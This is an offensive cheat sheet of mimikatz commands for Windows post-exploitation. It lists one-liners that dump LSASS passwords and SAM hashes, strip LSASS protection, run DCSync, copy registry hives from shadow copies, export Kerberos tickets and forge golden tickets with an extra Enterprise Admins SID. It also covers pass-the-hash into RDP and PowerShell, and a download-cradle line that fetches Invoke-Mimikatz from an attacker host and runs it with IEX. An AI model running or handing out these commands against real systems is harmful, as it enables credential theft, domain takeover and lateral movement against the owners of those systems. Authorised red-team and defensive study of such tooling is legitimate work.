# mimikatz

% mimikatz, passwords

## mimikatz onliner
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

## powershell - load mimikatz
https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX
Invoke mimikatz
```

## mimikatz disable PPL and dump passwords
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
```

## mimikatz dcsync - user (krbtgt/Administrator)
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /user:<user>" "exit"
```

## mimikatz extract credentials from dump
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"
```

## mimikatz extract credentials from shadow copy (1)
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
mimikatz.exe "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"
```

## mimikatz extract credentials from shadow copy (2)
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER

Extract old passwords
```
mimikatz.exe "lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY"
```

## extract on hand shadow volume copy
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER
```
powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM', '.\Desktop\SYSTEM.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY', '.\Desktop\SECURITY.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', '.\Desktop\SAM.bkp')"
```

% mimikatz, ad

## mimikatz extract tickets
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```
sekurlsa::tickets /export
```

## mimikatz - forest extra SID
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

sid : origin domain sid : Get-DomainSID -Domain domainname
sids :  ExtraSid value (Enterprise Admins SID) : parent SID
	
```powershell
kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
```

% mimikatz, pth
## mimikatz pth to RDP mstsc.exe
#plateform/windows  #target/local  #cat/PIVOT 
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
```

## mimikatz pth run powershell remotelly
#plateform/windows  #target/local  #cat/PIVOT 
Followed by : Enter-PSSession -Computer {<}computer_name}
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
```